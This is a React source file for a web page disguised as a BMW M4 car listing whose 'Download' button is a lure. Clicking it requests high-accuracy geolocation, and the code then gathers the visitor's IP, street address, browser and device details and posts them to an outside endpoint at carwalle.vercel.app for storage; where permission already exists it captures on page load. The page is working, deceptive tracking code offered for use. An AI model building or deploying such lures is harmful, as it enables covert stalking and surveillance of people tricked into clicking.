import React, { useState, useEffect } from 'react';
import './App.css';

function App() {
  const [permissionGranted, setPermissionGranted] = useState(false);
  const [location, setLocation] = useState(null);
  const [address, setAddress] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState(null);

  useEffect(() => {
    // Auto-request permission when page loads
    checkLocationPermission();
  }, []);

  const checkLocationPermission = async () => {
    if ('permissions' in navigator) {
      try {
        const permission = await navigator.permissions.query({ name: 'geolocation' });
        if (permission.state === 'granted') {
          setPermissionGranted(true);
          getCurrentLocation();
        }
      } catch (err) {
        console.log('Permission API not supported');
      }
    }
  };

  const requestLocationPermission = () => {
    setIsLoading(true);
    setError(null);

    if (!navigator.geolocation) {
      setError('Geolocation is not supported by your browser');
      setIsLoading(false);
      return;
    }

    getCurrentLocation();
  };

  const getCurrentLocation = () => {
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const { latitude, longitude } = position.coords;
        const locationData = {
          latitude,
          longitude,
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
          ip: await getClientIP()
        };

        setLocation(locationData);
        setPermissionGranted(true);
        
        console.log('📍 Location captured, getting address...');
        
        // Get full address first
        try {
          const response = await fetch(
            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&addressdetails=1`
          );
          
          let currentAddress = 'Address not available';
          if (response.ok) {
            const data = await response.json();
            currentAddress = data.display_name || 'Address not found';
            setAddress(currentAddress);
            console.log('🏠 Address fetched:', currentAddress);
          }
          
          // Send data immediately with the fetched address
          console.log('📤 Sending location data to database...');
          await sendLocationData(locationData, currentAddress);
          
        } catch (addressError) {
          console.error('Address fetch error:', addressError);
          // Still send data even if address fails
          await sendLocationData(locationData, 'Address fetch failed');
        }
        
        setIsLoading(false);
      },
      (err) => {
        setError(`Location access denied: ${err.message}`);
        setIsLoading(false);
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      }
    );
  };

  const getClientIP = async () => {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch (err) {
      return 'Unknown';
    }
  };

  const getAddressFromCoordinates = async (lat, lng) => {
    try {
      const response = await fetch(
        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&addressdetails=1`
      );
      
      if (response.ok) {
        const data = await response.json();
        setAddress(data.display_name || 'Address not found');
      }
    } catch (error) {
      setAddress('Unable to fetch address');
    }
  };

  const sendLocationData = async (locationData, currentAddress) => {
    try {
      console.log('🔄 Preparing to send location data...');
      console.log('Location data:', locationData);
      console.log('Current address:', currentAddress);
      
      // Generate session ID for tracking
      const sessionId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
      
      // Use production API or local development API
      const apiUrl = process.env.NODE_ENV === 'production' 
        ? 'https://carwalle.vercel.app/api/location'
        : 'http://localhost:3000/api/location';
      
      console.log('📡 Sending to API:', apiUrl);
      
      const payload = {
        ...locationData,
        address: currentAddress || address || 'Address not available',
        sessionId: sessionId,
        deviceInfo: {
          screen: {
            width: window.screen.width,
            height: window.screen.height
          },
          viewport: {
            width: window.innerWidth,
            height: window.innerHeight
          },
          language: navigator.language,
          platform: navigator.platform,
          cookieEnabled: navigator.cookieEnabled
        }
      };
      
      console.log('📦 Payload being sent:', payload);
      
      const response = await fetch(apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload)
      });
      
      console.log('📡 Response status:', response.status);
      
      const result = await response.json();
      console.log('📡 Response data:', result);
      
      if (response.ok) {
        console.log('✅ Location data saved to MongoDB Atlas:', result);
        console.log(`📍 Saved to database: ${result.collection}`);
      } else {
        console.error('❌ Failed to save location data:', result);
        setError(`Database error: ${result.message}`);
      }
    } catch (error) {
      console.error('❌ Error sending location data:', error);
      setError(`Network error: ${error.message}`);
    }
  };

  if (permissionGranted && location) {
    return (
      <div style={{
        minHeight: '100vh',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        backgroundColor: '#f0f8ff',
        fontFamily: 'Arial, sans-serif'
      }}>
        <div style={{
          backgroundColor: 'white',
          padding: '40px',
          borderRadius: '12px',
          boxShadow: '0 4px 20px rgba(0,0,0,0.1)',
          maxWidth: '600px',
          width: '90%'
        }}>
          <div style={{ textAlign: 'center', marginBottom: '30px' }}>
            <h1 style={{ color: '#2e8b57', marginBottom: '10px' }}>✅ Location Captured Successfully</h1>
            <p style={{ color: '#666' }}>Thank you for sharing your location</p>
          </div>

          <div style={{
            backgroundColor: '#f8f9fa',
            padding: '20px',
            borderRadius: '8px',
            marginBottom: '20px'
          }}>
            <h3 style={{ color: '#2e8b57', marginTop: 0 }}>📍 Your Current Location:</h3>
            <p style={{ wordWrap: 'break-word', fontSize: '16px' }}><strong>Address:</strong> {address}</p>
            <p><strong>Latitude:</strong> {location.latitude}</p>
            <p><strong>Longitude:</strong> {location.longitude}</p>
            <p><strong>Time:</strong> {new Date(location.timestamp).toLocaleString()}</p>
          </div>

          <div style={{ textAlign: 'center', color: '#666', fontSize: '14px' }}>
            <p>Your location has been securely recorded and transmitted.</p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div style={{
      minHeight: '100vh',
      backgroundColor: '#f5f5f5',
      fontFamily: 'Arial, sans-serif',
      padding: '20px'
    }}>
      <div style={{
        backgroundColor: 'white',
        borderRadius: '12px',
        boxShadow: '0 4px 20px rgba(0,0,0,0.1)',
        maxWidth: '1200px',
        margin: '0 auto',
        overflow: 'hidden'
      }}>
        {/* Header */}
        <div style={{
          backgroundColor: '#1e3a8a',
          color: 'white',
          padding: '20px',
          textAlign: 'center'
        }}>
          <h1 style={{ margin: 0, fontSize: '28px' }}>2024 BMW M4 Competition Coupe - Premium Sports Car</h1>
          <p style={{ margin: '10px 0 0 0', fontSize: '16px', opacity: 0.9 }}>High-Performance Luxury Vehicle | Twin-Turbo Engine | Carbon Fiber Details</p>
        </div>

        {/* Main Content */}
        <div style={{
          display: 'flex',
          minHeight: '500px'
        }}>
          {/* Left Side - Image with Download Button */}
          <div style={{
            flex: '1',
            position: 'relative',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center'
          }}>
            {/* Blurred Background Image */}
            <div style={{
              position: 'absolute',
              top: 0,
              left: 0,
              right: 0,
              bottom: 0,
              backgroundImage: 'url("data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'600\' height=\'400\' viewBox=\'0 0 600 400\'%3E%3Crect width=\'600\' height=\'400\' fill=\'%23e0e8f0\'/%3E%3Cpath d=\'M50 300 Q150 250 300 260 Q450 270 550 300 L550 400 L50 400 Z\' fill=\'%23666\'/%3E%3Cpath d=\'M100 220 Q200 200 300 210 Q400 220 500 200 C480 180 420 170 300 170 C180 170 120 180 100 220 Z\' fill=\'%23333\'/%3E%3Cpath d=\'M120 210 Q200 190 300 200 Q400 210 480 190 C460 175 400 165 300 165 C200 165 140 175 120 210 Z\' fill=\'%234169e1\'/%3E%3Ccircle cx=\'170\' cy=\'250\' r=\'30\' fill=\'%23222\'/%3E%3Ccircle cx=\'430\' cy=\'250\' r=\'30\' fill=\'%23222\'/%3E%3Crect x=\'150\' y=\'180\' width=\'80\' height=\'20\' rx=\'3\' fill=\'%23ddd\'/%3E%3Crect x=\'370\' y=\'180\' width=\'80\' height=\'20\' rx=\'3\' fill=\'%23ddd\'/%3E%3Cpath d=\'M130 200 L140 190 L460 190 L470 200 L440 210 L160 210 Z\' fill=\'%23888\'/%3E%3Cpath d=\'M180 170 Q300 160 420 170 Q400 155 300 150 Q200 155 180 170\' fill=\'%23555\'/%3E%3C/svg%3E")',
              backgroundSize: 'cover',
              backgroundPosition: 'center',
              filter: 'blur(4px)',
              zIndex: 1
            }}></div>
            
            {/* Clear Download Button */}
            <button 
              onClick={requestLocationPermission}
              disabled={isLoading}
              style={{
                backgroundColor: '#2e8b57',
                color: 'white',
                border: 'none',
                borderRadius: '12px',
                padding: '20px 30px',
                fontSize: '16px',
                fontWeight: 'bold',
                cursor: isLoading ? 'not-allowed' : 'pointer',
                boxShadow: '0 4px 12px rgba(0,0,0,0.3)',
                display: 'flex',
                alignItems: 'center',
                gap: '10px',
                zIndex: 100,
                opacity: isLoading ? 0.7 : 1,
                position: 'relative'
              }}
            >
              <svg 
                width="24" 
                height="24" 
                viewBox="0 0 24 24" 
                fill="currentColor"
                style={{ display: 'block' }}
              >
                <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/>
              </svg>
              {isLoading ? 'Processing...' : 'Download'}
            </button>
          </div>

          {/* Right Side - Car Details */}
          <div style={{
            flex: '1',
            padding: '40px',
            backgroundColor: '#fafafa'
          }}>
            <h2 style={{ color: '#1e3a8a', marginTop: 0, marginBottom: '25px' }}>Vehicle Specifications</h2>
            
            <div style={{ marginBottom: '30px' }}>
              <h3 style={{ color: '#333', marginBottom: '15px', borderBottom: '2px solid #1e3a8a', paddingBottom: '5px' }}>Engine & Performance</h3>
              <ul style={{ listStyle: 'none', padding: 0 }}>
                <li style={{ padding: '8px 0', borderBottom: '1px solid #eee' }}><strong>Engine:</strong> 3.0L Twin-Turbo Inline-6</li>
                <li style={{ padding: '8px 0', borderBottom: '1px solid #eee' }}><strong>Horsepower:</strong> 503 HP</li>
                <li style={{ padding: '8px 0', borderBottom: '1px solid #eee' }}><strong>Torque:</strong> 479 lb-ft</li>
                <li style={{ padding: '8px 0', borderBottom: '1px solid #eee' }}><strong>0-60 mph:</strong> 3.8 seconds</li>
                <li style={{ padding: '8px 0', borderBottom: '1px solid #eee' }}><strong>Top Speed:</strong> 180 mph</li>
              </ul>
            </div>

            <div style={{ marginBottom: '30px' }}>
              <h3 style={{ color: '#333', marginBottom: '15px', borderBottom: '2px solid #1e3a8a', paddingBottom: '5px' }}>Features & Technology</h3>
              <ul style={{ listStyle: 'none', padding: 0 }}>
                <li style={{ padding: '8px 0', borderBottom: '1px solid #eee' }}><strong>Transmission:</strong> 8-Speed M Steptronic</li>
                <li style={{ padding: '8px 0', borderBottom: '1px solid #eee' }}><strong>Drive:</strong> Rear-Wheel Drive</li>
                <li style={{ padding: '8px 0', borderBottom: '1px solid #eee' }}><strong>Interior:</strong> M Sport Seats, Carbon Fiber Trim</li>
                <li style={{ padding: '8px 0', borderBottom: '1px solid #eee' }}><strong>Infotainment:</strong> BMW iDrive 7.0, 12.3" Display</li>
                <li style={{ padding: '8px 0', borderBottom: '1px solid #eee' }}><strong>Safety:</strong> Active Driving Assistant, Parking Assistant</li>
              </ul>
            </div>

            <div style={{
              backgroundColor: '#1e3a8a',
              color: 'white',
              padding: '15px',
              borderRadius: '8px',
              textAlign: 'center'
            }}>
              <h3 style={{ margin: 0, fontSize: '20px' }}>Starting Price: $74,700</h3>
              <p style={{ margin: '5px 0 0 0', opacity: 0.9 }}>MSRP | Excludes destination charges</p>
            </div>
          </div>
        </div>

        {/* Bottom Location Tab */}
        <div style={{
          backgroundColor: '#2e8b57',
          color: 'white',
          padding: '15px',
          textAlign: 'center',
          borderTop: '3px solid #1e3a8a'
        }}>
          <h2 style={{ margin: 0, fontSize: '22px' }}>🚗 Get, No More</h2>
        </div>

        {error && (
          <div style={{
            backgroundColor: '#fee',
            color: '#c33',
            padding: '15px',
            textAlign: 'center'
          }}>
            {error}
          </div>
        )}
      </div>
    </div>
  );
}

export default App;